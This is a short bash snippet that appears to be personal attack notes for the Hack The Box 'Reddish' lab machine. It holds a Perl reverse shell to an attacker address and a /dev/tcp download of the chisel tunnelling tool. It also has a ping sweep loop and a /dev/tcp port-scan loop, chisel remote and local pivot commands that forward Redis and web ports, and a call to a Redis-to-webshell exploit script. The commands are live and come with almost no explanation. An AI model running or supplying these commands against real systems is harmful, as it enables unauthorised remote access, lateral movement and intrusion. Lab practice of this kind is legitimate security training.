
```bash
13492c3c28a60b2a4a00971f3c9a6629

perl -e 'use Socket;$i="10.10.14.123";$p=8002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
# file transfers
nc -lvnp $port <

bash -c "cat < /dev/tcp/10.10.14.123/6969 > /tmp/chisel"

# Network sweep
for i in $(seq 1 254); do (ping -c 1 172.$SUBNet.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
# Portscan
for port in $(seq 1 65535); do (echo Hello > /dev/tcp/172.19.0.2/$port && echo "open - $port") 2> /dev/null; done
# Port Redirection - Remote Pivot
# Kali
./chisel server -p 10000 -reverse -v  
# Reddish
nohup ./chisel client 10.10.14.123:10000 R:127.0.0.1:6379:172.19.0.2:6379 &
nohup ./chisel client 10.10.14.123:10000 R:127.0.0.1:10002:172.19.0.3:80 &
# Chisel - Local Pivot
nohup ./chisel client 10.10.14.123:10000 10003:127.0.0.1:10003 &


# Redis RCE to Webshell
./0xdfreddishRCE.sh








```
